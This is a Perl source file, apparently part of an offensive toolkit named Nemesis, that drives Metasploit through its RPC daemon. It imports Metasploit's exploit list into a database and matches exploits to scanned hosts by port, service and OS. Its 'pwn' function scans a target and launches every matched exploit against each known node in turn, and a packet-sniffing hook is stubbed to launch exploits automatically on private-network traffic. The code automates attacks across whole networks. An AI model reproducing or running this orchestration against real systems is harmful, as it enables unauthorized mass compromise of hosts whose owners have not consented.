package MiddleWare::metasploit;
use Resources::Models::Exploit;
use Resources::Models::Node;
use Nemesis::BaseModule -base;
use Net::IP;

my $VERSION = '0.1a';
my $AUTHOR  = "mudler";
my $MODULE  = "Metasploit Module";
my $INFO    = "<www.dark-lab.net>";

#Funzioni che fornisco.
our @PUBLIC_FUNCTIONS
    = qw(start console clear sessionlist call test generate matchExpl pwn)
    ;    #NECESSARY

#Attributo Processo del demone MSFRPC
has 'Process';

#Risorsa MSFRPC che mi fornirà il modo di connettermi a MSFRPC
has 'MSFRPC';
has 'DB';

sub prepare {
    my $self = shift;
    $self->MSFRPC( $self->Init->getModuleLoader->loadmodule("MSFRPC") );
    $self->DB( $self->Init->ml->getInstance("Database") );
    $self->Process( $self->Init->ml->module("Jobs")->tag("msfrpcd") )
        if $self->Init->ml->module("Jobs")->tag("msfrpcd")
        ;    #If exist i load the process

    ## Adds the extractor to the DB to access special fields.
    # $self->DB->add_extractor(
    #     Search::GIN::Extract::Callback->new(    ## Extract callback
    #         extract => sub {
    #             my ( $obj, $extractor, @args ) = @_;

    #             ##### If it's an exploit add those to the index.
    #             if ( $obj->isa("Resources::Models::Exploit") ) {
    #                 return {
    #                     default_rport => $obj->default_rport,
    #                     RPORT         => $obj->RPORT,
    #                     module        => $obj->module,

    #                 };
    #             }

    #             return;
    #         },
    #     )
    # );
    ## Another way to accomplish the same it's to use the Role Resources::API::GINIndexing and specify in the object what are the indexed fields

}

sub start {
    my $self = shift;

    #return 1 if ( $self->Process && $self->Process->is_running );

    my $Io = $self->Init->getIO();

    my $processString
        = 'msfrpcd -U '
        . $self->MSFRPC->Username . ' -P '
        . $self->MSFRPC->Password . ' -p '
        . $self->MSFRPC->Port
        . ' -S -f';    #FOREGROUND
    $Io->print_info("Starting msfrpcd service.")
        ;    #AVVIO il demone msfrpc con le configurazioni della risorsa
    my $Process
        = $self->Init->ml->loadmodule('Process');   ##Carico il modulo process
    $Process->set(
        tag  => 'msfrpcd',
        type => 'daemon',                           # tipologia demone
        code => $processString                      # linea di comando...
    );
    if ( $Process->start() ) {                      #Avvio
        $self->Process($Process)
            ;    #Nell'attributo processo del plugin ci inserisco il processo

        if ( $Process->is_running ) {
            $Io->print_info("Service msfrcpd started")
                ;    #Controllo se si è avviato
                     # $Io->process_status($Process);    #Stampo lo status
            $Io->print_alert(
                "Now you have to give some time to metasploit to be up and running.."
            );
        }
    }

}

sub safe_database {
    my $self = shift;
    my $result
        = $self->DB->search( { class => "Resources::Models::Exploit" } );
    while ( my $block = $result->next ) {
        foreach my $item (@$block) {
            my $result2 = $self->DB->search( { module => $item->module } );
            while ( my $block2 = $result2->next ) {
                foreach my $item2 (@$block2) {
                    if ( $item ne $item2 ) {
                        $self->DB->delete($item2);
                        $self->Init->getIO->debug("Deleting $item2");
                    }
                }
            }
        }
    }

}

sub LaunchExploitOnNode {
    my $self         = shift;
    my $Node         = shift;
    my $Exploit      = shift;
    my $LaunchResult = $self->MSFRPC->exploit(
        $Exploit->module,
        {
            ##   PAYLOAD=>undef,
            ##   TARGET=>undef,
            ##   ACTION=> undef,
            RHOST => $Node->ip,
            RPORT => $Exploit->RPORT
                || $Exploit->default_rport,
            LHOST => $Exploit->LHOST
                || undef,
            LPORT => $self->MSFRPC->{handler_port}
        }
    );
    if ( $LaunchResult == 1 ) {
        $self->Init->io->info("Exploit successful...maybe");
        $self->MSFRPC->handler_port( $self->MSFRPC->handler_port + 1 );
        return 1;
    }
    return 0;

}

sub event_Resources__Exploit {
    my $self = shift;
    $self->Init->io->debug("Exploit generated correctly!");
}

sub generate {
    my $self = shift;

    $self->is_avaible;

    $self->populateDB;

    #   $self->safe_database;

}

sub is_avaible {
    my $self = shift;
    $self->start() if ( !defined $self->Process );
    while ( $self->Process->is_running ) {
        sleep 5;
        $self->Init->io->alert("waiting for meta and retrying");

        if ( $self->is_up ) {
            $self->Init->io->info("finally it's up");

            last;
        }
        else {
            $self->Init->io->alert("meta doesn't answer yet");

        }
    }

}

sub is_up {
    my $self = shift;
    if ( $self->MSFRPC ) {
        my $MSFRPC   = $self->MSFRPC;
        my $response = $MSFRPC->call('core.version');
        if ( exists( $response->{'version'} ) ) {
            return 1;
        }
    }

    return 0;

}

sub populateDB {
    my $self   = shift;
    my $MSFRPC = $self->MSFRPC;
    my $DB     = $self->Init->ml->getInstance("Database");
    my $IO     = $self->Init->io;

    #  $self->start if ( !$self->Process or !$self->Process->is_running );

    $self->generate() if !$self->Init->ml->module("Jobs")->tag("msfrpcd");
    my $response = $MSFRPC->call('module.exploits');

    my @EXPL_LIST = @{ $response->{'modules'} };

    $IO->print_alert("Syncing db with msf exploits, this can take a while");
    $IO->print_info(
        "There are " . scalar(@EXPL_LIST) . " exploits in metasploit" );
    my $Counter = 0;
    foreach my $exploit (@EXPL_LIST) {
        my $result = $DB->search( { module => $exploit } );
        if ( !defined($result) or $result->items == 0 ) {
            $IO->debug("Adding $exploit to Exploit DB");
            my $Information = $MSFRPC->info( "exploits", $exploit );
            my $Options = $MSFRPC->options( "exploits", $exploit );
            $MSFRPC->parse_result;

            my @Targets = values %{ $Information->{'targets'} };
            my @References = map { $_ = join( "|", @{$_} ); }
                @{ $Information->{'references'} };
            $IO->debug( $exploit
                    . " supports the following targets: "
                    . join( " ", @Targets ) );
            my $Expl = Resources::Models::Exploit->new(
                type          => "exploits",
                module        => $exploit,
                rank          => $Information->{'rank'},
                description   => $Information->{'description'},
                name          => $Information->{'name'},
                targets       => \@Targets,
                references    => \@References,
                default_rport => $Options->{'RPORT'}->{'default'},
                RPORT         => $Options->{'RPORT'}->{'default'}
            );
            $IO->info( "adding " . $exploit );

            $DB->add($Expl);
            $Counter++;
        }
        else {
            $IO->info("Exploit already in the database");
        }
    }
    $IO->print_info(" $Counter added");
}

sub test {
    my $self = shift;
    $self->is_avaible;
    $self->LaunchExploitOnNode(
        Resources::Models::Node->new( ip => "127.0.0.1" ),
        Resources::Models::Exploit->new(
            type          => "exploits",
            module        => "windows/misc/ib_isc_attach_database",
            default_rport => 9090
        )
    );

}

sub matchExpl ($) {
    my $self   = shift;
    my $String = shift;

    my @Objs = $self->DB->rsearch(
        {   class  => "Resources::Models::Exploit",
            module => $String
        }
    );

    $self->Init->getIO->print_tabbed(
        "Found a total of " . scalar(@Objs) . " objects for $String", 3 );
    foreach my $item (@Objs) {
        $self->Init->getIO->print_tabbed(
            "Found " . $item->module . " " . $item->name, 4 );
    }
    return @Objs;

}

sub pwn {
    my $self = shift;
    my $host = shift || undef;
    my @Hosts;
    if ($host) {
        my $results = $self->Init->ml->getInstance("Database")
            ->search( { ip => $host } );
        while ( my $chunk = $results->next ) {
            push( @Hosts, $_ ) for (@$chunk);
        }

        ##At least we try to acquire it thru the scanner, i think that is what you want

        ## execute it's tracked in the history, instead calling the istance
        if ( @Hosts == 0 ) {

            $self->Init->ml->execute( "Scanner", "scan", $host );
            $results = $self->Init->ml->getInstance("Database")
                ->search( { ip => $host } );
            while ( my $chunk = $results->next ) {
                push( @Hosts, $_ ) for (@$chunk);
            }

        }

    }
    else {
        my $results = $self->Init->ml->getInstance("Database")
            ->search( { class => "Resources::Models::Node" } );
        while ( my $chunk = $results->next ) {
            push( @Hosts, $_ ) for (@$chunk);
        }
    }
    $self->Init->io->info( "Found " . @Hosts . " to attack" );
    $self->Init->io->info( "=> " . $_->ip . " selected" ) for (@Hosts);

    $self->is_avaible;
    foreach my $Node (@Hosts) {
        $self->Init->io->info( "Attacking " . $Node->ip );
        {
            my $scope = $self->DB->new_scope()
                ;    #KiokuDB needs that for accessing at attachments
            my $exploit_n        = $Node->attachments->size;
            my $exploit_launched = 0;
            foreach my $PotentialExploit ( $Node->attachments->members ) {
                $exploit_launched++;
                next if !$PotentialExploit->isa("Resources::Models::Exploit");
                $self->Init->io->info(
                          "[$exploit_launched/$exploit_n] Trying "
                        . $PotentialExploit->module . " on "
                        . $Node->ip );

                if ( $self->LaunchExploitOnNode( $Node, $PotentialExploit ) )
                {
                    ## A successful exploitation
                    $PotentialExploit->successful(1);
                    $self->Init->ml->getInstance("Database")
                        ->update($PotentialExploit);

                }
            }
        }
    }
}

sub matchNode {

    my $self = shift;
    my $Node = shift;
    $self->Init->getIO->print_info(
        "Matching the node against Metasploit database");
    foreach my $port ( @{ $Node->ports } ) {
        my ( $porta, $service ) = split( /\|/, $port );
        foreach my $expl (
            ( $self->matchExpl($service), $self->matchPort($porta) ) )
        {
            next if !$expl->targets;
            $self->Init->getIO->print_info(
                "Exploit targets: " . join( "\t", @{ $expl->targets } ) );
            foreach my $target ( @{ $expl->targets } ) {
                my $os
                    = $Node->os =~ /embedded/
                    ? "linux"
                    : $Node->os;    #it's a good assumption, i know
                $Node->attachments->insert($expl) and last
                    if ( $target =~ /$os|Automatic/i );
            }
        }
    }
    return $Node;
}

sub matchPort {
    my $self   = shift;
    my $String = shift;
    my $Objs   = $self->DB->search( { default_rport => $String } );
    return () if ( !$Objs );
    $self->Init->getIO->print_tabbed(
        "Found " . $Objs->items . " matching exploit for port $String", 3 );
    my @Return;
    while ( my $chunk = $Objs->next ) {
        for my $item (@$chunk) {
            $self->Init->getIO->print_tabbed(
                "Found " . $item->module . " " . $item->name, 4 );
            push( @Return, $item );
        }
    }
    return @Return;

}

sub sessionlist {
    my $self = shift;
    $self->MSFRPC->call("session.list");
}

sub call {
    my $self   = shift;
    my $String = shift;
    $self->MSFRPC->call($String);
}

sub clear {
    my $self = shift;
    $self->Process->destroy() if ( $self->Process ); #Destroy instance on exit
}

sub event_tcp() {
    my $self  = shift;
    my $Frame = shift;
    my $Ip    = $Frame->ref->{'IPv4'};

    my $Tcp     = $Frame->ref->{'TCP'};
    my $InfoIP  = Net::IP->new( $Ip->src );
    my $SrcType = $InfoIP->iptype;
    if ( $SrcType eq "PRIVATE" ) {

        foreach my $FoundExploit (
            ( $self->matchPort( $Tcp->src ), $self->matchPort( $Tcp->dst ) ) )
        {    # really greedy

            # if it's private, have sense parse the packet

            #Update Database with new information
            #Launch Exploit

        }
    }

    # my $IO=$Init->io;
    # my $PrivIp;
    # my $PubIp;
    # my $SourcePort;
    # my $DestPort;
    # foreach my $Packet(@Packet_info){
    #      if( $Packet->isa("NetPacket::IP") ) {
    #             my $InfoIP=Net::IP->new($Packet->{src_ip});
    #             my $SrcType=$InfoIP->iptype;
    #              $InfoIP=Net::IP->new($Packet->{dest_ip});
    #             my  $DstType=$InfoIP->iptype;
    #             if($SrcType eq "PRIVATE"  ) {
    #                 $PrivIp=$SrcType;
    #             }else {
    #                 $PubIp=$SrcType;
    #             }
    #             if($DstType eq "PRIVATE"){
    #                 $PrivIp=$DstType;
    #             } else {
    #                 $PubIp=$DstType;
    #             }
    #         } elsif( $Packet->isa("NetPacket::TCP") ) {
    #             $SourcePort=$Packet->{src_port};
    #             $DestPort=$Packet->{dest_port};
    #         }
    # }

# if(defined($PrivIp)){
#                        my $DBHost;
#    $Init->io->info("searching for matches for $PrivIp : $SourcePort/$DestPort");

    #    my $results=$self->DB->search(ip => $PrivIp);

    #    while( my $chunk = $results->next ){
    #                  foreach my $foundhost (@$chunk){
    #                   $DBHost=$foundhost;
    #                   last;
    #               }
    #     }

#   foreach my $FoundExploit(($self->matchPort($SourcePort),$self->matchPort($DestPort))){
#   #Update Database with new information
#     #Launch Exploit

    #    }
    # }
}

1;

